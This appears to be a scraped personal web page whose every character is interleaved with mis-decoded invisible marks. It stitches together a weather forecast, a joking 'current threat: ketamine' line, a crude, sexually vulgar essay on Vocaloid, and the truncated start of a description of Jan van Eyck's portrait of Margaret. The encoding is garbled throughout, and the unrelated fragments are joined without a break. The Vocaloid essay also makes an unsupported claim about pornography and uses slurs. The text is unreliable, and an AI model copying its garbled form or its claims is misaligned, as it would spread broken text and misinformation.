P‚Äéa‚Äér‚Äét‚Äél‚Äéy‚Äé ‚Äéc‚Äél‚Äéo‚Äéu‚Äéd‚Äéy‚Äé ‚Äét‚Äéh‚Äéi‚Äés‚Äé ‚Äée‚Äév‚Äée‚Äén‚Äéi‚Äén‚Äég‚Äé ‚Äét‚Äéh‚Äée‚Äén‚Äé ‚Äéb‚Äée‚Äéc‚Äéo‚Äém‚Äéi‚Äén‚Äég‚Äé ‚Äéc‚Äél‚Äéo‚Äéu‚Äéd‚Äéy‚Äé ‚Äéw‚Äéi‚Äét‚Äéh‚Äé ‚Äép‚Äée‚Äér‚Äéi‚Äéo‚Äéd‚Äés‚Äé ‚Äéo‚Äéf‚Äé ‚Äél‚Äéi‚Äég‚Äéh‚Äét‚Äé ‚Äér‚Äéa‚Äéi‚Äén‚Äé ‚Äéa‚Äéf‚Äét‚Äée‚Äér‚Äé ‚Äém‚Äéi‚Äéd‚Äén‚Äéi‚Äég‚Äéh‚Äét‚Äé.‚Äé ‚ÄéL‚Äéo‚Äéw‚Äé ‚Äé5‚Äé3‚ÄéF‚Äé.‚Äé ‚ÄéW‚Äéi‚Äén‚Äéd‚Äés‚Äé ‚ÄéS‚ÄéE‚Äé ‚Äéa‚Äét‚Äé ‚Äé1‚Äé0‚Äé ‚Äét‚Äéo‚Äé ‚Äé2‚Äé0‚Äé ‚Äém‚Äép‚Äéh‚Äé.‚Äé ‚ÄéC‚Äéh‚Äéa‚Äén‚Äéc‚Äée‚Äé ‚Äéo‚Äéf‚Äé ‚Äér‚Äéa‚Äéi‚Äén‚Äé ‚Äé9‚Äé0‚Äé%‚Äé.‚Äé
 ‚Äé
H‚Äéu‚Äém‚Äéi‚Äéd‚Äéi‚Äét‚Äéy‚Äé
8‚Äé2‚Äé%‚Äé
U‚ÄéV‚Äé ‚ÄéI‚Äén‚Äéd‚Äée‚Äéx‚Äé
0‚Äé ‚Äéo‚Äéf‚Äé ‚Äé1‚Äé1‚Äé
M‚Äéo‚Äéo‚Äén‚Äér‚Äéi‚Äés‚Äée‚Äé
3‚Äé:‚Äé3‚Äé9‚Äé ‚Äéa‚Äém‚Äé
W‚Äéa‚Äén‚Äéi‚Äén‚Äég‚Äé ‚ÄéC‚Äér‚Äée‚Äés‚Äéc‚Äée‚Äén‚Äét‚Äé
M‚Äéo‚Äéo‚Äén‚Äés‚Äée‚Äét‚Äé
2‚Äé:‚Äé1‚Äé1‚Äé ‚Äép‚Äém‚Äé
M‚Äéo‚Äén‚Äé ‚Äé0‚Äé8‚Äé
T‚Äéh‚Äéu‚Äén‚Äéd‚Äée‚Äér‚Äés‚Äéh‚Äéo‚Äéw‚Äée‚Äér‚Äés‚Äé
7‚Äé1‚Äé¬∞‚Äé
/‚Äé3‚Äé9‚Äé¬∞‚Äé
9‚Äé2‚Äé%‚Äé
W‚ÄéS‚ÄéW‚Äé ‚Äé1‚Äé8‚Äé ‚Äém‚Äép‚Äéh‚Äé
T‚Äéu‚Äée‚Äé ‚Äé0‚Äé9‚Äé
S‚Äéu‚Äén‚Äén‚Äéy‚Äé
5‚Äé9‚Äé¬∞‚Äé
/‚Äé3‚Äé4‚Äé¬∞‚Äé
0‚Äé%‚Äé
N‚ÄéW‚Äé ‚Äé1‚Äé8‚Äé ‚Äém‚Äép‚Äéh‚Äé
W‚Äée‚Äéd‚Äé ‚Äé1‚Äé0‚Äé
P‚Äéa‚Äér‚Äét‚Äél‚Äéy‚Äé ‚ÄéC‚Äél‚Äéo‚Äéu‚Äéd‚Äéy‚Äé
6‚Äé7‚Äé¬∞‚Äé
/‚Äé4‚Äé2‚Äé¬∞‚Äé
0‚Äé%‚Äé
S‚ÄéS‚ÄéW‚Äé ‚Äé1‚Äé6‚Äé ‚Äém‚Äép‚Äéh‚Äé
T‚Äéh‚Äéu‚Äé ‚Äé1‚Äé1‚Äé
P‚Äéa‚Äér‚Äét‚Äél‚Äéy‚Äé ‚ÄéC‚Äél‚Äéo‚Äéu‚Äéd‚Äéy‚Äé
7‚Äé3‚Äé¬∞‚Äé
/‚Äé5‚Äé0‚Äé¬∞‚Äé
9‚Äé%‚Äé
S‚ÄéS‚ÄéW‚Äé ‚Äé1‚Äé2‚Äé ‚Äém‚Äép‚Äéh‚Äé
F‚Äér‚Äéi‚Äé ‚Äé1‚Äé2‚Äé
S‚Äéu‚Äén‚Äén‚Äéy‚Äé
5‚Äé8‚Äé¬∞‚Äé
/‚Äé2‚Äé9‚Äé¬∞‚Äé
2‚Äé2‚Äé%‚Äé
N‚ÄéW‚Äé ‚Äé1‚Äé8‚Äé ‚Äém‚Äép‚Äéh‚Äé
S‚Äéa‚Äét‚Äé ‚Äé1‚Äé3‚Äé
S‚Äéu‚Äén‚Äén‚Äéy‚Äé
5‚Äé4‚Äé¬∞‚Äé
/‚Äé3‚Äé7‚Äé¬∞‚Äé
0‚Äé%‚Äé
W‚Äé ‚Äé1‚Äé1‚Äé ‚Äém‚Äép‚Äéh‚Äé
S‚Äéu‚Äén‚Äé ‚Äé1‚Äé4‚Äé
M‚Äéo‚Äés‚Äét‚Äél‚Äéy‚Äé ‚ÄéS‚Äéu‚Äén‚Äén‚Äéy‚Äé
6‚Äé2‚Äé¬∞‚Äé
/‚Äé4‚Äé5‚Äé¬∞‚Äé
7‚Äé%‚Äé
S‚Äé ‚Äé1‚Äé3‚Äé ‚Äém‚Äép‚Äéh‚Äé
M‚Äéo‚Äén‚Äé ‚Äé1‚Äé5‚Äé
A‚ÄéM‚Äé ‚ÄéS‚Äéh‚Äéo‚Äéw‚Äée‚Äér‚Äés‚Äé
6‚Äé1‚Äé¬∞‚Äé
/‚Äé3‚Äé3‚Äé¬∞‚Äé
3‚Äé2‚Äé%‚Äé
N‚Äé ‚Äé1‚Äé3‚Äé ‚Äém‚Äép‚Äéh‚Äé
T‚Äéu‚Äée‚Äé ‚Äé1‚Äé6‚Äé
P‚Äéa‚Äér‚Äét‚Äél‚Äéy‚Äé ‚ÄéC‚Äél‚Äéo‚Äéu‚Äéd‚Äéy‚Äé
5‚Äé5‚Äé¬∞‚Äé
/‚Äé3‚Äé2‚Äé¬∞‚Äé
1‚Äé1‚Äé%‚Äé
N‚Äé ‚Äé1‚Äé1‚Äé ‚Äém‚Äép‚Äéh‚Äé
W‚Äée‚Äéd‚Äé ‚Äé1‚Äé7‚Äé
P‚Äéa‚Äér‚Äét‚Äél‚Äéy‚Äé ‚ÄéC‚Äél‚Äéo‚Äéu‚Äéd‚Äéy‚Äé
5‚Äé6‚Äé¬∞‚Äé
/‚Äé3‚Äé7‚Äé¬∞‚Äé
1‚Äé%‚Äé
E‚ÄéN‚ÄéE‚Äé ‚Äé9‚Äé ‚Äém‚Äép‚Äéh‚Äé
T‚Äéh‚Äéu‚Äé ‚Äé1‚Äé8‚Äé
M‚Äéo‚Äés‚Äét‚Äél‚Äéy‚Äé ‚ÄéC‚Äél‚Äéo‚Äéu‚Äéd‚Äéy‚Äé
6‚Äé1‚Äé¬∞‚Äé
/‚Äé4‚Äé1‚Äé¬∞‚Äé
1‚Äé0‚Äé%‚Äé
E‚ÄéN‚ÄéE‚Äé ‚Äé9‚Äé ‚Äém‚Äép‚Äéh‚Äé
F‚Äér‚Äéi‚Äé ‚Äé1‚Äé9‚Äé
M‚Äéo‚Äés‚Äét‚Äél‚Äéy‚Äé ‚ÄéC‚Äél‚Äéo‚Äéu‚Äéd‚Äéy‚Äé
5‚Äé9‚Äé¬∞‚Äé
/‚Äé3‚Äé7‚Äé¬∞‚Äé
1‚Äé6‚Äé%‚Äé
N‚ÄéN‚ÄéE‚Äé ‚Äé1‚Äé0‚Äé ‚Äém‚Äép‚Äéh‚Äé
S‚Äéa‚Äét‚Äé ‚Äé2‚Äé0‚Äé
P‚Äéa‚Äér‚Äét‚Äél‚Äéy‚Äé ‚ÄéC‚Äél‚Äéo‚Äéu‚Äéd‚Äéy‚Äé
5‚Äé7‚Äé¬∞‚Äé
/‚Äé4‚Äé1‚Äé¬∞‚Äé
1‚Äé5‚Äé%‚Äé
N‚ÄéE‚Äé ‚Äé1‚Äé0‚Äé ‚Äém‚Äép‚Äéh‚Äé
S‚Äéu‚Äén‚Äé ‚Äé2‚Äé1‚Äé
P‚Äéa‚Äér‚Äét‚Äél‚Äéy‚Äé ‚ÄéC‚Äél‚Äéo‚Äéu‚Äéd‚Äéy‚Äé
6‚Äé0‚Äé¬∞‚Äé
/‚Äé4‚Äé2‚Äé¬∞‚Äé
2‚Äé4‚Äé%‚Äé
E‚ÄéN‚ÄéE‚Äé ‚Äé9‚Äé ‚Äém‚Äép‚Äéh‚Äé

.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé

C‚Äéu‚Äér‚Äér‚Äée‚Äén‚Äét‚Äé ‚Äét‚Äéh‚Äér‚Äée‚Äéa‚Äét‚Äé:‚Äé ‚ÄéK‚Äée‚Äét‚Äéa‚Äém‚Äéi‚Äén‚Äée‚Äé.‚Äé ‚Äéüß¥

.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé

V‚Äéo‚Äéc‚Äéa‚Äél‚Äéo‚Äéi‚Äéd‚Äé
I‚Äén‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äég‚Äér‚Äéo‚Äét‚Äée‚Äés‚Äéq‚Äéu‚Äée‚Äé ‚Äél‚Äéa‚Äén‚Äéd‚Äé ‚Äéo‚Äéf‚Äé ‚Äéw‚Äée‚Äée‚Äéa‚Äéb‚Äéo‚Äéo‚Äés‚Äé,‚Äé ‚Äér‚Äéo‚Äén‚Äée‚Äér‚Äéy‚Äé ‚Äéw‚Äée‚Äée‚Äéa‚Äéb‚Äéo‚Äéo‚Äés‚Äé ‚Äéo‚Äéf‚Äét‚Äée‚Äén‚Äé ‚Äéf‚Äéi‚Äén‚Äéd‚Äé ‚Äét‚Äéh‚Äée‚Äém‚Äés‚Äée‚Äél‚Äév‚Äée‚Äés‚Äé ‚Äét‚Äéu‚Äér‚Äén‚Äéi‚Äén‚Äég‚Äé ‚Äét‚Äéo‚Äé ‚Äét‚Äée‚Äéc‚Äéh‚Äén‚Äéo‚Äél‚Äéo‚Äég‚Äéy‚Äé ‚Äéf‚Äéo‚Äér‚Äé ‚Äéc‚Äéo‚Äém‚Äép‚Äéa‚Äén‚Äéi‚Äéo‚Äén‚Äés‚Äéh‚Äéi‚Äép‚Äé.‚Äé ‚ÄéH‚Äéo‚Äéw‚Äée‚Äév‚Äée‚Äér‚Äé,‚Äé ‚Äéd‚Äéa‚Äét‚Äéi‚Äén‚Äég‚Äé ‚Äés‚Äéi‚Äém‚Äés‚Äé ‚Äéc‚Äéa‚Äén‚Äé ‚Äéo‚Äén‚Äél‚Äéy‚Äé ‚Äéd‚Äéo‚Äé ‚Äés‚Äéo‚Äé ‚Äém‚Äéu‚Äéc‚Äéh‚Äé ‚Äéf‚Äéo‚Äér‚Äé ‚Äéa‚Äé ‚Äém‚Äéa‚Äén‚Äé,‚Äé ‚Äéa‚Äén‚Äéd‚Äé ‚Äét‚Äéh‚Äée‚Äér‚Äée‚Äé'‚Äés‚Äé ‚Äéo‚Äén‚Äél‚Äéy‚Äé ‚Äés‚Äéo‚Äé ‚Äém‚Äéu‚Äéc‚Äéh‚Äé ‚ÄéS‚Äéa‚Äéi‚Äél‚Äéo‚Äér‚Äé ‚ÄéM‚Äéo‚Äéo‚Äén‚Äé ‚Äéh‚Äée‚Äén‚Äét‚Äéa‚Äéi‚Äé ‚Äéo‚Äéu‚Äét‚Äé ‚Äét‚Äéh‚Äée‚Äér‚Äée‚Äé ‚Äét‚Äéo‚Äé ‚Äéf‚Äéa‚Äép‚Äé ‚Äét‚Äéo‚Äé.‚Äé ‚ÄéA‚Äén‚Äéd‚Äé ‚Äéb‚Äée‚Äés‚Äéi‚Äéd‚Äée‚Äés‚Äé:‚Äé ‚ÄéT‚Äéh‚Äée‚Äés‚Äée‚Äé ‚Äés‚Äée‚Äér‚Äéi‚Äée‚Äés‚Äé'‚Äé ‚Äéo‚Äéf‚Äé ‚Äés‚Äét‚Äéi‚Äél‚Äél‚Äé ‚Äéi‚Äém‚Äéa‚Äég‚Äée‚Äés‚Äé ‚Äél‚Äéa‚Äéc‚Äék‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äéa‚Äél‚Äél‚Äé ‚Äéi‚Äém‚Äép‚Äéo‚Äér‚Äét‚Äéa‚Äén‚Äét‚Äé ‚Äés‚Äéo‚Äéu‚Äén‚Äéd‚Äé ‚Äéo‚Äéf‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äéf‚Äée‚Äém‚Äéa‚Äél‚Äée‚Äé ‚Äév‚Äéo‚Äéi‚Äéc‚Äée‚Äé,‚Äé ‚Äéo‚Äéf‚Äéf‚Äée‚Äér‚Äéi‚Äén‚Äég‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äév‚Äéi‚Äée‚Äéw‚Äée‚Äér‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äér‚Äée‚Äéa‚Äés‚Äés‚Äéu‚Äér‚Äéa‚Äén‚Äéc‚Äée‚Äé ‚Äét‚Äéh‚Äée‚Äéy‚Äé ‚Äés‚Äéo‚Äé ‚Äéd‚Äée‚Äés‚Äép‚Äée‚Äér‚Äéa‚Äét‚Äée‚Äél‚Äéy‚Äé ‚Äéc‚Äér‚Äéa‚Äév‚Äée‚Äé ‚Äéa‚Äén‚Äéd‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äés‚Äéw‚Äée‚Äée‚Äét‚Äé ‚Äém‚Äéo‚Äéa‚Äén‚Äés‚Äé ‚Äéo‚Äéf‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äéf‚Äée‚Äém‚Äéa‚Äél‚Äée‚Äé ‚Äéo‚Äér‚Äég‚Äéa‚Äés‚Äém‚Äé.‚Äé ‚ÄéS‚Äéo‚Äé,‚Äé ‚ÄéJ‚Äéa‚Äép‚Äéa‚Äén‚Äé'‚Äés‚Äé ‚Äét‚Äéo‚Äép‚Äé ‚Äés‚Äéc‚Äéi‚Äée‚Äén‚Äét‚Äéi‚Äés‚Äét‚Äés‚Äé ‚Äéd‚Äée‚Äév‚Äée‚Äél‚Äéo‚Äép‚Äée‚Äéd‚Äé ‚Äéa‚Äé ‚Äép‚Äér‚Äéo‚Äég‚Äér‚Äéa‚Äém‚Äé ‚Äét‚Äéo‚Äé ‚Äée‚Äém‚Äéu‚Äél‚Äéa‚Äét‚Äée‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äés‚Äéo‚Äéu‚Äén‚Äéd‚Äé ‚Äéo‚Äéf‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äéf‚Äée‚Äém‚Äéa‚Äél‚Äée‚Äé ‚Äév‚Äéo‚Äéi‚Äéc‚Äée‚Äé,‚Äé ‚Äéd‚Äéu‚Äéb‚Äéb‚Äéi‚Äén‚Äég‚Äé ‚Äéi‚Äét‚Äé ‚Äé""‚ÄéV‚Äéo‚Äéc‚Äéa‚Äél‚Äéo‚Äéi‚Äéd‚Äé""‚Äé,‚Äé ‚Äéa‚Äén‚Äéd‚Äé ‚Äém‚Äéa‚Äér‚Äék‚Äée‚Äét‚Äé ‚Äéi‚Äét‚Äé ‚Äéa‚Äés‚Äé ‚Äéa‚Äé ‚Äém‚Äéu‚Äés‚Äéi‚Äéc‚Äé-‚Äém‚Äéa‚Äék‚Äéi‚Äén‚Äég‚Äé ‚Äét‚Äéo‚Äéo‚Äél‚Äé ‚Äés‚Äéo‚Äé ‚Äét‚Äéh‚Äée‚Äéi‚Äér‚Äé ‚Äéf‚Äée‚Äél‚Äél‚Äéo‚Äéw‚Äé ‚Äéo‚Äét‚Äéa‚Äék‚Äéu‚Äé ‚Äéc‚Äéo‚Äéu‚Äél‚Äéd‚Äé ‚Äép‚Äér‚Äée‚Äét‚Äée‚Äén‚Äéd‚Äé ‚Äét‚Äéh‚Äée‚Äéy‚Äé ‚Äéa‚Äér‚Äée‚Äé ‚Äém‚Äéu‚Äés‚Äéi‚Äéc‚Äéi‚Äéa‚Äén‚Äés‚Äé ‚Äéw‚Äéh‚Äée‚Äén‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äéc‚Äéa‚Äés‚Äéh‚Äéi‚Äée‚Äér‚Äé ‚Äér‚Äéi‚Äén‚Äég‚Äés‚Äé ‚Äéu‚Äép‚Äé ‚Äét‚Äéh‚Äée‚Äéi‚Äér‚Äé ‚Äég‚Äéi‚Äér‚Äél‚Äé-‚Äéi‚Äén‚Äé-‚Äéa‚Äé-‚Äéb‚Äéo‚Äéx‚Äé.‚Äé.‚Äé.‚Äé

.‚Äé.‚Äé.‚ÄéW‚Äéh‚Äéa‚Äét‚Äée‚Äév‚Äée‚Äér‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äéc‚Äéa‚Äés‚Äée‚Äé ‚Äém‚Äéa‚Äéy‚Äé ‚Äéb‚Äée‚Äé,‚Äé ‚Äét‚Äéh‚Äée‚Äér‚Äée‚Äé ‚Äéi‚Äés‚Äé ‚Äén‚Äéo‚Äé ‚Äéd‚Äée‚Äén‚Äéy‚Äéi‚Äén‚Äég‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äéi‚Äém‚Äép‚Äéa‚Äéc‚Äét‚Äé ‚ÄéV‚Äéo‚Äéc‚Äéa‚Äél‚Äéo‚Äéi‚Äéd‚Äé ‚Äéh‚Äéa‚Äés‚Äé ‚Äéh‚Äéa‚Äéd‚Äé ‚Äéo‚Äén‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äém‚Äéu‚Äés‚Äéi‚Äéc‚Äé ‚Äéi‚Äén‚Äéd‚Äéu‚Äés‚Äét‚Äér‚Äéy‚Äé.‚Äé ‚ÄéA‚Äéf‚Äét‚Äée‚Äér‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äés‚Äéh‚Äéo‚Äéc‚Äék‚Äéi‚Äén‚Äég‚Äé ‚Äéc‚Äéo‚Äén‚Äéf‚Äéi‚Äér‚Äém‚Äéa‚Äét‚Äéi‚Äéo‚Äén‚Äés‚Äé ‚Äét‚Äéh‚Äéa‚Äét‚Äé ‚Äéb‚Äéo‚Äét‚Äéh‚Äé ‚ÄéB‚Äér‚Äéi‚Äét‚Äén‚Äée‚Äéy‚Äé ‚ÄéS‚Äép‚Äée‚Äéa‚Äér‚Äés‚Äé ‚Äéa‚Äén‚Äéd‚Äé ‚ÄéL‚Äéa‚Äéd‚Äéy‚Äé ‚ÄéG‚Äéa‚Äég‚Äéa‚Äé ‚Äéa‚Äér‚Äée‚Äé ‚Äém‚Äée‚Äér‚Äée‚Äél‚Äéy‚Äé ‚ÄéM‚Äéi‚Äék‚Äéu‚Äé ‚Äél‚Äéi‚Äép‚Äé-‚Äés‚Äéy‚Äén‚Äéc‚Äéh‚Äée‚Äér‚Äés‚Äé,‚Äé ‚Äéa‚Äén‚Äéd‚Äé ‚Äét‚Äéa‚Äék‚Äéi‚Äén‚Äég‚Äé ‚Äéi‚Äén‚Äét‚Äéo‚Äé ‚Äéa‚Äéc‚Äéc‚Äéo‚Äéu‚Äén‚Äét‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äéa‚Äés‚Äét‚Äéo‚Äéu‚Äén‚Äéd‚Äéi‚Äén‚Äég‚Äé ‚Äéa‚Äém‚Äéo‚Äéu‚Äén‚Äét‚Äé ‚Äéo‚Äéf‚Äé ‚ÄéV‚Äéo‚Äéc‚Äéa‚Äél‚Äéo‚Äéi‚Äéd‚Äé ‚Äém‚Äéu‚Äés‚Äéi‚Äéc‚Äé ‚Äév‚Äéi‚Äéd‚Äée‚Äéo‚Äés‚Äé ‚Äéa‚Äév‚Äéa‚Äéi‚Äél‚Äéa‚Äéb‚Äél‚Äée‚Äé ‚Äéo‚Äén‚Äé ‚ÄéN‚Äéi‚Äéc‚Äéo‚Äé ‚ÄéN‚Äéi‚Äéc‚Äéo‚Äé ‚ÄéD‚Äéo‚Äéu‚Äég‚Äéa‚Äé ‚Äé(‚ÄéT‚Äéh‚Äée‚Äé ‚ÄéJ‚Äéa‚Äép‚Äéa‚Äén‚Äée‚Äés‚Äée‚Äé ‚Äév‚Äée‚Äér‚Äés‚Äéi‚Äéo‚Äén‚Äé ‚Äéo‚Äéf‚Äé ‚ÄéY‚Äéo‚Äéu‚ÄéT‚Äéu‚Äéb‚Äée‚Äé)‚Äé,‚Äé ‚ÄéV‚Äéo‚Äéc‚Äéa‚Äél‚Äéo‚Äéi‚Äéd‚Äé ‚Äéi‚Äés‚Äé ‚Äéa‚Äé ‚Äév‚Äée‚Äér‚Äéi‚Äét‚Äéa‚Äéb‚Äél‚Äée‚Äé ‚Äém‚Äée‚Äéd‚Äéi‚Äéa‚Äé ‚Äép‚Äéo‚Äéw‚Äée‚Äér‚Äéh‚Äéo‚Äéu‚Äés‚Äée‚Äé.‚Äé ‚ÄéW‚Äéi‚Äét‚Äéh‚Äé ‚Äér‚Äée‚Äéa‚Äél‚Äé ‚ÄéJ‚Äé-‚ÄéP‚Äéo‚Äép‚Äé ‚Äés‚Äéu‚Äép‚Äée‚Äér‚Äés‚Äét‚Äéa‚Äér‚Äés‚Äé ‚Äéh‚Äéa‚Äév‚Äéi‚Äén‚Äég‚Äé ‚Äéc‚Äéo‚Äén‚Äét‚Äér‚Äéi‚Äéb‚Äéu‚Äét‚Äée‚Äéd‚Äé ‚Äét‚Äéh‚Äée‚Äéi‚Äér‚Äé ‚Äév‚Äéo‚Äéi‚Äéc‚Äée‚Äés‚Äé ‚Äét‚Äéo‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äét‚Äée‚Äéc‚Äéh‚Äén‚Äéo‚Äél‚Äéo‚Äég‚Äéy‚Äé ‚Äé(‚ÄéI‚Äén‚Äéc‚Äél‚Äéu‚Äéd‚Äéi‚Äén‚Äég‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äél‚Äéi‚Äék‚Äée‚Äés‚Äé ‚Äéo‚Äéf‚Äé ‚ÄéG‚Äéa‚Äéc‚Äék‚Äét‚Äé ‚Äéa‚Äén‚Äéd‚Äé ‚Äés‚Äéo‚Äém‚Äée‚Äé ‚Äéo‚Äét‚Äéh‚Äée‚Äér‚Äé ‚Äép‚Äéo‚Äép‚Äé-‚Äés‚Äét‚Äéa‚Äér‚Äé ‚Äéc‚Äéu‚Äén‚Äét‚Äés‚Äé ‚Äéy‚Äéo‚Äéu‚Äé ‚Äés‚Äéh‚Äéo‚Äéu‚Äél‚Äéd‚Äé ‚Äéb‚Äée‚Äé ‚Äéa‚Äés‚Äéh‚Äéa‚Äém‚Äée‚Äéd‚Äé ‚Äéi‚Äéf‚Äé ‚Äéy‚Äéo‚Äéu‚Äé ‚Äék‚Äén‚Äéo‚Äéw‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äén‚Äéa‚Äém‚Äée‚Äés‚Äé ‚Äéo‚Äéf‚Äé ‚Äéo‚Äéf‚Äéf‚Äé-‚Äéh‚Äéa‚Äén‚Äéd‚Äé)‚Äé,‚Äé ‚Äéa‚Äé ‚ÄéP‚ÄéS‚ÄéP‚Äé ‚Äég‚Äéa‚Äém‚Äée‚Äé ‚Äés‚Äét‚Äéa‚Äér‚Äér‚Äéi‚Äén‚Äég‚Äé ‚ÄéM‚Äéi‚Äék‚Äéu‚Äé ‚Äé(‚ÄéW‚Äéh‚Äéi‚Äéc‚Äéh‚Äé ‚Äés‚Äéo‚Äél‚Äéd‚Äé ‚Äép‚Äéo‚Äéo‚Äér‚Äél‚Äéy‚Äé ‚Äéd‚Äéu‚Äée‚Äé ‚Äét‚Äéo‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äéf‚Äéa‚Äéc‚Äét‚Äé ‚Äét‚Äéh‚Äéa‚Äét‚Äé ‚Äén‚Äéo‚Äéb‚Äéo‚Äéd‚Äéy‚Äé ‚Äés‚Äét‚Äéi‚Äél‚Äél‚Äé ‚Äég‚Äéi‚Äév‚Äée‚Äés‚Äé ‚Äéa‚Äé ‚Äés‚Äéh‚Äéi‚Äét‚Äé ‚Äéa‚Äéb‚Äéo‚Äéu‚Äét‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚ÄéP‚ÄéS‚ÄéP‚Äé)‚Äé,‚Äé ‚Äéa‚Äén‚Äéd‚Äé ‚Äée‚Äév‚Äée‚Äén‚Äé ‚Äéa‚Äé ‚ÄéV‚Äéo‚Äéc‚Äéa‚Äél‚Äéo‚Äéi‚Äéd‚Äé-‚Äés‚Äép‚Äéo‚Äén‚Äés‚Äéo‚Äér‚Äée‚Äéd‚Äé ‚Äér‚Äéa‚Äéc‚Äée‚Äéc‚Äéa‚Äér‚Äé ‚Äéi‚Äén‚Äé ‚ÄéJ‚Äéa‚Äép‚Äéa‚Äén‚Äé'‚Äés‚Äé ‚ÄéS‚Äéu‚Äép‚Äée‚Äér‚Äé ‚ÄéG‚ÄéT‚Äé ‚ÄéS‚Äée‚Äér‚Äéi‚Äée‚Äés‚Äé,‚Äé ‚ÄéV‚Äéo‚Äéc‚Äéa‚Äél‚Äéo‚Äéi‚Äéd‚Äé'‚Äés‚Äé ‚Äés‚Äéu‚Äéc‚Äéc‚Äée‚Äés‚Äés‚Äé ‚Äéi‚Äés‚Äé ‚Äéa‚Äé ‚Äéh‚Äéi‚Äés‚Äét‚Äéo‚Äér‚Äéi‚Äéc‚Äé ‚Äée‚Äéx‚Äéa‚Äém‚Äép‚Äél‚Äée‚Äé ‚Äéo‚Äéf‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äéi‚Äén‚Äéf‚Äél‚Äéu‚Äée‚Äén‚Äéc‚Äée‚Äé ‚Äép‚Äéo‚Äér‚Äén‚Äé ‚Äéh‚Äéa‚Äés‚Äé ‚Äéo‚Äén‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äée‚Äéc‚Äéo‚Äén‚Äéo‚Äém‚Äéy‚Äé.‚Äé


(‚Äé(‚Äé ‚ÄéV‚ÄéO‚ÄéC‚ÄéA‚ÄéL‚ÄéO‚ÄéI‚ÄéD‚ÄéS‚Äé,‚Äé ‚ÄéH‚ÄéM‚ÄéM‚ÄéM‚Äé?‚Äé ‚Äé)‚Äé)‚Äé

.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé.‚Äé
	‚Äé
P‚Äéo‚Äér‚Äét‚Äér‚Äéa‚Äéi‚Äét‚Äé ‚Äéo‚Äéf‚Äé ‚ÄéM‚Äéa‚Äér‚Äég‚Äéa‚Äér‚Äée‚Äét‚Äé ‚Äév‚Äéa‚Äén‚Äé ‚ÄéE‚Äéy‚Äéc‚Äék‚Äé ‚Äéi‚Äés‚Äé ‚Äéa‚Äé ‚Äé1‚Äé4‚Äé3‚Äé9‚Äé ‚Äéo‚Äéi‚Äél‚Äé-‚Äéo‚Äén‚Äé-‚Äéw‚Äéo‚Äéo‚Äéd‚Äé ‚Äép‚Äéa‚Äéi‚Äén‚Äét‚Äéi‚Äén‚Äég‚Äé ‚Äéb‚Äéy‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚ÄéE‚Äéa‚Äér‚Äél‚Äéy‚Äé ‚ÄéN‚Äée‚Äét‚Äéh‚Äée‚Äér‚Äél‚Äéa‚Äén‚Äéd‚Äéi‚Äés‚Äéh‚Äé ‚Äéa‚Äér‚Äét‚Äéi‚Äés‚Äét‚Äé ‚ÄéJ‚Äéa‚Äén‚Äé ‚Äév‚Äéa‚Äén‚Äé ‚ÄéE‚Äéy‚Äéc‚Äék‚Äé.‚Äé ‚ÄéA‚Äé ‚Äép‚Äéo‚Äér‚Äét‚Äér‚Äéa‚Äéi‚Äét‚Äé ‚Äéo‚Äéf‚Äé ‚Äéh‚Äéi‚Äés‚Äé ‚Äéw‚Äéi‚Äéf‚Äée‚Äé ‚ÄéM‚Äéa‚Äér‚Äég‚Äéa‚Äér‚Äée‚Äét‚Äé,‚Äé ‚Äéi‚Äét‚Äé ‚Äéi‚Äés‚Äé ‚Äéo‚Äén‚Äée‚Äé ‚Äéo‚Äéf‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äét‚Äéw‚Äéo‚Äé ‚Äél‚Äéa‚Äét‚Äée‚Äés‚Äét‚Äé ‚Äéo‚Äéf‚Äé ‚Äév‚Äéa‚Äén‚Äé ‚ÄéE‚Äéy‚Äéc‚Äék‚Äé'‚Äés‚Äé ‚Äés‚Äéu‚Äér‚Äév‚Äéi‚Äév‚Äéi‚Äén‚Äég‚Äé ‚Äép‚Äéa‚Äéi‚Äén‚Äét‚Äéi‚Äén‚Äég‚Äés‚Äé,‚Äé ‚Äéa‚Äén‚Äéd‚Äé ‚Äéo‚Äén‚Äée‚Äé ‚Äéo‚Äéf‚Äé ‚Äét‚Äéh‚Äée‚Äé ‚Äée‚Äéa‚Äér‚Äél‚Äéi‚Äée‚Äés‚Äét‚Äé ‚ÄéE‚Äéu‚Äér‚Äéo‚Äép‚Äée‚Äéa‚Äén‚Äé ‚Äéa‚Äér‚Äét‚Äéw‚Äéo‚Äér‚Äék‚Äés‚Äé 